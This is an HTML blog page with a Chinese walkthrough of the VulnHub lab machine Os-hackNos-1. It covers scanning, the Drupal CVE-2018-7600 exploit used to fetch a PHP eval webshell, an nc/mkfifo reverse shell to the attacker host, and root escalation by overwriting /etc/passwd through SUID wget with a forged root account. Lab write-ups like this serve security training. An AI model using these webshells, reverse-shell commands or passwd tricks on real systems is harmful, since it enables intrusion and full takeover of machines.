@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="𝐴_𝑌𝑢">
+
+
+
+
+
+<title>vulhub靶场—Os-hackNos-1 | 𝓐_𝚼𝓾ʹ𝒔 𝓑ℓ𝖔𝓰</title>
+
+
+
+    <link rel="icon" href="/image/favicon.svg">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1614813_fp9wxdcpr9c.css"
+<meta name="generator" content="Hexo 6.1.0"></head>
+<body>
+    <div class="wrapper">
+        <link rel="stylesheet" href="../fonts/iconfont2/iconfont.css"> 
+
+<header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/"><i class="iconfont icon-zhuye"></i>主页</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">
+                        
+                            <i class="iconfont icon-archives "></i>
+                        
+                        
+                        
+                        
+                        文章
+                    </a>
+                
+                    <a class="menu-item" href="/category">
+                        
+                        
+                            <i class="iconfont icon-categorys "></i>
+                        
+                        
+                        
+                        分类
+                    </a>
+                
+                    <a class="menu-item" href="/tag">
+                        
+                        
+                        
+                            <i class="iconfont icon-tags "></i>
+                        
+                        
+                        标签
+                    </a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">主页</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; 菜单</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">
+                        
+                            <i class="iconfont icon-archives "></i>
+                        
+                        
+                        
+                        
+                        文章
+                    </a>
+                
+                    <a class="menu-item" href="/category">
+                        
+                        
+                            <i class="iconfont icon-categorys "></i>
+                        
+                        
+                        
+                        分类
+                    </a>
+                
+                    <a class="menu-item" href="/tag">
+                        
+                        
+                        
+                            <i class="iconfont icon-tags "></i>
+                        
+                        
+                        标签
+                    </a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">vulhub靶场—Os-hackNos-1</h1>
+            
+                <div class="post-meta">
+                    
+                        <!--作者:-->
+                        <i class="iconfont icon-user"></i>
+                        <a itemprop="author" rel="author" href="/">𝐴_𝑌𝑢 </a> &nbsp;
+                    
+
+                    
+                        <span class="post-time">
+                        <!--发布时间:-->
+                        <i class="iconfont icon-time"></i>
+                        <a href="#">2022-05-13&nbsp;&nbsp;10:29:02</a> &nbsp;
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                        <!--分类:-->
+                        <i class="iconfont icon-category"></i>
+                            
+                                <a href="/categories/vulhub%E9%9D%B6%E6%9C%BA/">vulhub靶机</a>&nbsp;
+                            
+                        </span>
+                    
+                    
+                    <span id="/2022/05/13/22-0513-01/" class="leancloud-visitors view" data-flag-title="vulhub靶场—Os-hackNos-1">
+                        <text class="post-meta-item-text">
+                            <!--阅读数:-->
+                            <i class="iconfont icon-view"></i>
+                        </text>
+                        
+                        <text class="leancloud-visitors-count">加载中</text>
+                      </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <blockquote>
+<p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacknos-os-hacknos,401/">https://www.vulnhub.com/entry/hacknos-os-hacknos,401/</a></p>
+<p>kali的ip：192.168.43.238，靶机的ip：192.168.43.192</p>
+</blockquote>
+<p>kali扫描存活主机，发现192.168.43.0网段下的192.168.43.192</p>
+<p><code>nmap -sP 192.168.43.0/24</code></p>
+<img src="/2022/05/13/22-0513-01/1648608139862-158c38e1-1af7-41bb-9fb9-caa7c53decc8.png" alt="img" style="zoom:80%;">
+
+<p>对192.168.43.192进行信息探测，<code>nmap -A -p- 192.168.43.192</code></p>
+<img src="/2022/05/13/22-0513-01/1648608388447-247684bf-de0d-4988-9d0b-0d98b434575b.png" alt="img" style="zoom:80%;">
+
+<p>用kali自带的dirb扫描目录</p>
+<img src="/2022/05/13/22-0513-01/1648608715172-7b3e3725-cefa-4a65-845f-072e2d3a0f0b.png" alt="img" style="zoom:80%;">
+
+<p>
+
+<img src="/2022/05/13/22-0513-01/1648608788542-2c1524b6-f1e6-4b03-b93d-c3f73e55f1fc.png" alt="img" style="zoom:80%;">
+
+</p><p>
+
+<img src="/2022/05/13/22-0513-01/1648608832511-419169e7-1b9f-4f49-9da9-ae32b523badd.png" alt="img" style="zoom:80%;">
+
+</p><p>发现drupal的版本为7.57，并且还找到了相关的配置文件，但是我们无法获取该文件内容</p>
+<img src="/2022/05/13/22-0513-01/1648615063950-9addd3c9-a44b-4544-a858-9d883adeb6ca-16532734734308.png" alt="img" style="zoom:80%;">
+
+<p>然后直接网上搜索看下有没有相关exp </p>
+<img src="/2022/05/13/22-0513-01/1648610994304-343aca24-6782-4db3-bc8b-795d31e2e193.png" alt="img" style="zoom:80%;">
+
+<p>直接发现了相关漏洞</p>
+<img src="/2022/05/13/22-0513-01/1648611100259-87d06ffd-8c73-41a0-8562-953d12779c96.png" alt="img" style="zoom:80%;">
+
+<p>下载相关exp</p>
+<img src="/2022/05/13/22-0513-01/1648611136869-44234e12-211b-4e7f-8c86-a32ab14931f0-165327352667313.png" alt="img" style="zoom:80%;">
+
+<p>
+
+<img src="/2022/05/13/22-0513-01/1648611821897-fe22b16e-c581-4b8d-99f9-9e3c8e848ce8.png" alt="img" style="zoom:80%;">
+
+</p><p>然后用cat命令查看settings配置文件，收集相关信息，后面可能用到（这里实际是用不到的）</p>
+<img src="/2022/05/13/22-0513-01/1648615291734-f69c4778-9880-43d7-bd51-e5dc4adff701.png" alt="img" style="zoom:80%;">
+
+<p>kali上准备一句话木马shell.php <code>&lt;?php @eval($_POST[&#39;qwe&#39;]);?&gt;</code></p>
+<p>然后在kali上开启web服务目的是可以让靶机反向连接kali下载kali上的一句话木马</p>
+<p>python3 -m http.server 80我们是在<del>目录下执行的，所以</del>目录就是之后访问ip的路径，然后把shell.php复制到~目录中</p>
+<img src="/2022/05/13/22-0513-01/1648617511532-c90fee96-864e-4979-b732-55ce383978ef.png" alt="img" style="zoom:80%;">
+
+<p>通过exp执行命令下载kali上的一句话木马shell.php</p>
+<p><code>python3 drupa7-CVE-2018-7600.py http://192.168.43.192/drupal/ -c &quot;wget http://192.168.43.238/shell.php&quot;</code></p>
+<img src="/2022/05/13/22-0513-01/1648617663529-33b83103-5b91-428c-9eea-91ab0f9f16c0.png" alt="img" style="zoom:80%;">
+
+<p>然后我们发现成功上传了一句话木马</p>
+<img src="/2022/05/13/22-0513-01/1648638469409-fad9ff6c-bb0e-4183-9f95-30239414d6c9.png" alt="img" style="zoom:80%;">
+
+<p>然后可以利用蚁剑连接shell.php</p>
+<img src="/2022/05/13/22-0513-01/1648638730268-f8885120-e30a-4348-a7e5-08330e1b67f4.png" alt="img" style="zoom:80%;">
+
+<p>这里蚁剑拿到的shell权限肯定是不够，权限是www-data权限，后续还要提权</p>
+<img src="/2022/05/13/22-0513-01/1648639315519-98b0660a-d391-4175-89b1-532dccb581f4.png" alt="img" style="zoom:80%;">
+
+<p>啥是www-data权限呀？？？和web服务有啥关系？？？</p>
+<p>在debian&#x2F;ubuntu上，www-data是默认运行web服务的用户&#x2F;组，一般在通过apt安装web服务程序时生成。搭建web服务的文件夹&#x2F;文件一般要设置成www-data的。</p>
+<p>另一种方法拿shell，参考暗月师傅</p>
+<p>在kali上传mOon.php，内容为<code>&lt;?php system($_POST[&#39;moon&#39;]);?&gt;</code>注意这个不是一句话木马，目的是通过命令执行反弹shell</p>
+<img src="/2022/05/13/22-0513-01/1648639054503-467d4a01-71c3-4cb9-91ac-3e51e13e74b7.png" alt="img" style="zoom:80%;">
+
+<p>然后使用burpsuite进行POST方式的提交，然后用nc命令进行反弹，当然这里靶机上是有nc的</p>
+<img src="/2022/05/13/22-0513-01/1648640119188-68616bb4-a47b-4b1c-8700-9f2a05054f3b.png" alt="img" style="zoom:80%;">
+
+<p>这里是burpsuite是GET方式进行提交的，我们可以改成POST方式</p>
+<img src="/2022/05/13/22-0513-01/1648640142749-ada0588a-2268-4398-9c8c-22489c92ba9c.png" alt="img" style="zoom:80%;">
+
+<p>然后可以让靶机成功执行id命令</p>
+<img src="/2022/05/13/22-0513-01/1648640171858-adc7478c-3b75-451d-93c3-31174be8b550.png" alt="img" style="zoom:80%;">
+
+<p>然后在kali上用nc监听9001端口</p>
+<img src="/2022/05/13/22-0513-01/1648642085295-6b33b6cf-151a-44eb-bc34-66a83f55291d.png" alt="img" style="zoom:80%;">
+
+<p>然后用nc反弹一个shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.43.238 9001 &gt;/tmp/f</span><br><span class="line"></span><br><span class="line">注意：nc反弹shell常用命令为 nc -e /bin/sh 192.168.43.238 9001，但是某些版本的nc没有-e这个参数，所以可以用上面方法反弹</span><br><span class="line">使用时要对rm /tmp/f;mkfifo/tmp/f;cat/tmp/f|/bin/sh -i 2&gt;&amp;1|192.168.43.238 9001&gt;/tmp/f进行编码</span><br><span class="line">rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+‐i+2&gt;%261|nc+192.168.43.238+9001+&gt;/tmp/f</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/05/13/22-0513-01/1648643081232-08c6e51a-735c-44c0-a440-5932de81283b.png" alt="img" style="zoom:80%;">
+
+<p>然后用<code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>命令切换成交互式shell</p>
+<img src="/2022/05/13/22-0513-01/1648644301919-38869793-22ef-4860-8320-ec7526fcffe4.png" alt="img" style="zoom:80%;">
+
+<p>
+
+<img src="/2022/05/13/22-0513-01/1648644419549-fb4e18f3-1844-4c97-b034-18d3992e1415.png" alt="img" style="zoom: 80%;">
+
+</p><p>然后尝试进入james用户的目录下</p>
+<img src="/2022/05/13/22-0513-01/1648644493367-98ccff87-1c20-4c7e-9a5e-ba68c3a3e4d7.png" alt="img" style="zoom:80%;">
+
+<p>查看user.txt文件，拿到Hash值，可以去md5解密</p>
+<img src="/2022/05/13/22-0513-01/1648644619416-3cd40e69-8a93-4e21-8d4c-0e0028c5ecc3.png" alt="img" style="zoom:80%;">
+
+<p>解密后实际会失败的（ememem解密还要付费，没钱 - -。）</p>
+<img src="/2022/05/13/22-0513-01/1648645520373-1e464eb5-e958-4ca4-b6d8-bb538c2066d0.png" alt="img" style="zoom:80%;">
+
+<p>然后找到了alexander.txt文件，并且发现文件内有一串base64的值</p>
+<img src="/2022/05/13/22-0513-01/1648645753135-2bcc3bdb-1187-48fd-94b9-1b3602127786.png" alt="img" style="zoom:80%;">
+
+<p>对base64值进行解码</p>
+<img src="/2022/05/13/22-0513-01/1648645854948-dc4357dd-0225-4f61-a02c-b4cb692f95da.png" alt="img" style="zoom:80%;">
+
+<p>发现了一些奇怪的东西，然后百度发现了该加密方式</p>
+<img src="/2022/05/13/22-0513-01/1648645883392-ef0a8717-1e60-4641-ad71-27d1c12ec79b-165327403601035.png" alt="img" style="zoom:80%;">
+
+<p><a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p>
+<img src="/2022/05/13/22-0513-01/1648646028100-a3e3e54f-c375-4df8-b3b2-6e10b135b05f.png" alt="img" style="zoom:80%;">
+
+<p>得到了james的密码</p>
+<img src="/2022/05/13/22-0513-01/1648646041137-e4117df2-3c0b-43aa-92ee-6ba09a34d54d.png" alt="img" style="zoom:80%;">
+
+<p>然后尝试用su命令<code>su - james</code>登陆james用户，登陆失败，尝试用ssh命令<code>ssh james@192.168.43.192</code>登陆james用户，还是失败，原因就是www-data权限实在是太低了，所以这里要进行提权，利用SUID进行提权</p>
+<p>查找具有root权限的SUID文件 <code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
+<img src="/2022/05/13/22-0513-01/1648646547405-b3edf5cc-fe1e-4ac5-bf23-a46dad4eb42d.png" alt="img" style="zoom:80%;">
+
+<p>这里发现wget有root权限，可以利用wget命令进行提权（也就是普通用户能够以root用户的身份来运行wget下载命令，那么可以利用root身份执行wget下载一个伪造的passwd文件来替换原有的passwd文件）</p>
+<p>首先伪造一个passwd文件，先把原来passwd文件中的内容复制出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false</span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false</span><br><span class="line">syslog:x:104:108::/home/syslog:/bin/false</span><br><span class="line">_apt:x:105:65534::/nonexistent:/bin/false</span><br><span class="line">lxd:x:106:65534::/var/lib/lxd/:/bin/false</span><br><span class="line">messagebus:x:107:111::/var/run/dbus:/bin/false</span><br><span class="line">uuidd:x:108:112::/run/uuidd:/bin/false</span><br><span class="line">dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false</span><br><span class="line">james:x:1000:1000:james,,,:/home/james:/bin/bash</span><br><span class="line">sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/false</span><br></pre></td></tr></table></figure>
+
+<p>然后在passwd里面仿照root伪造一个新的用户moonsec，并且有root权限，如下：</p>
+<p><code>moonsec:x:0:0:root:/root:/bin/bash</code></p>
+<p>但是这里的moonsec的密码x肯定是不对的，实际passwd中的x仅仅是不显示出来而已</p>
+<p>所以用openssl生成moonsec的密码123456，openssl使用方法如下：</p>
+<img src="/2022/05/13/22-0513-01/1648648292379-dd817053-f8f9-4320-b08d-83a997cceec6.png" alt="img" style="zoom:80%;">
+
+<p><code>openssl passwd ‐1 ‐salt moonsec 123456</code>这里盐值为moonsec密码就是123456，盐值实际指定啥都是可以的</p>
+<img src="/2022/05/13/22-0513-01/1648648964233-01c78615-3ae1-42ba-8b46-c26014df09b3.png" alt="img" style="zoom:80%;">
+
+<p>然后重新在passwd中伪造moonsec用户</p>
+<p><code>moonsec:$1$moonsec$Zo8rbBypEa7Gt6vL8qy841:0:0:root:/root:/bin/bash</code></p>
+<p>这样就伪造了新的passwd文件，文件内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false</span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false</span><br><span class="line">syslog:x:104:108::/home/syslog:/bin/false</span><br><span class="line">_apt:x:105:65534::/nonexistent:/bin/false</span><br><span class="line">lxd:x:106:65534::/var/lib/lxd/:/bin/false</span><br><span class="line">messagebus:x:107:111::/var/run/dbus:/bin/false</span><br><span class="line">uuidd:x:108:112::/run/uuidd:/bin/false</span><br><span class="line">dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false</span><br><span class="line">james:x:1000:1000:james,,,:/home/james:/bin/bash</span><br><span class="line">sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">moonsec:$1$moonsec$Zo8rbBypEa7Gt6vL8qy841:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>然后kali本地执行<code>python3 -m http.server 800</code></p>
+<img src="/2022/05/13/22-0513-01/1648649200840-4f8f3b6a-62e8-40a7-92c9-0a2d080d4e75.png" alt="img" style="zoom:80%;">
+
+<p>然后用wget -O下载passwd文件覆盖原来的passwd文件  <code>wget http://192.168.43.238:800/passwd -O /etc/passwd</code></p>
+<img src="/2022/05/13/22-0513-01/1648649430876-ce40151e-6740-4466-aa15-0820e77a5178.png" alt="img" style="zoom:80%;">
+
+<p>然后用su - moonsec命令登陆就可以拿到root权限了！！！！</p>
+<img src="/2022/05/13/22-0513-01/1648649507453-35b97831-fde7-462b-8253-2906042e94dd.png" alt="img" style="zoom:80%;">
+
+
+        </div>		
+		
+        <section class="post-tags">
+            <div>
+                <span>标签:</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="/">
+                    <i class="iconfont icon-home"></i>
+                    主页
+                </a>
+                <span>· </span>
+                <a href="javascript:window.history.back();">
+                    <i class="iconfont icon-back"></i>
+                    返回
+                </a>
+                
+                
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2022/05/14/22-0514-01/">PTT</a>
+            
+            
+            <a class="next" rel="next" href="/2022/05/12/22-0512-01/">MSF常用命令集合</a>
+            
+        </section>
+        <br>
+        
+            <section id="comments" class="comments">
+              <style>
+                  .comments{ margin-top: 30px;}
+                  .v .vlist .vcard .vcontent {padding-top: 0;}
+                  .vcontent p { color:grey; margin-bottom: 10px;}
+                  .v * {line-height: normal;}
+                  .v .vwrap  {border-radius: 0px; padding: 10px;}
+                  .v .vbtn {border-radius: 0px;}
+                  .v code, .v pre {border-radius: 0px;}
+                  .v .vlist .vcard .vhead .vsys {border-radius: 1px; padding: 2px;}
+                  .v .vlist .vcard .vhead .vnick {color: #2d96bd;}
+                  .v .vlist .vcard .vh .vmeta .vat{color: #c7254e;}
+                  .v .vlist .vcard {padding-top: 0;}
+                  .v .vlist .vcard .vimg { width: 2.5em; height: 2.5em; }
+                  .v .vlist .vcard .vquote .vimg { width: 2.5em; height: 2.5em; }
+              </style>
+              <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+    new Valine({
+        app_id: 'baahrwTTyOayDYUv5AtkdGJj-gzGzoHsz',
+        app_key: 'iTfzn8X60g9v0zTtnvToc09l',
+        placeholder: '想对作者说点什么...',
+        notify: 'false',
+        verify: 'false',
+        avatar: 'retro',
+        visitor: 'true'
+    });
+</script>
+            </section>
+        
+    </article>
+</div>
+
+
+
+<style>
+
+.post-wrap { table-layout:fixed; word-break:break-all; overflow:hidden; }
+
+</style>
+        </div>
+        <footer id="footer" class="footer">
+
+ <div class="copyright">
+
+ <span>© 𝐴_𝑌𝑢
+
+ <!-- 访客数量 -->
+
+ 
+
+ <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    | 总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"><i class="fa fa-spinner fa-spin"></i></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    | 总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"><i class="fa fa-spinner fa-spin"></i></i>
+</span>
+
+
+ 
+
+ </span>
+
+ </div>
+
+</footer>
+    </div>
+</body>
+</html>
+
+
+	
+
+
+
+<script type="text/javascript" src="\js\jquery.js"></script>
+<script type="text/javascript" src="\js\jquery.min.js"></script>
+
+<script  type="text/javascript" src="\js\snow.js"></script>
+
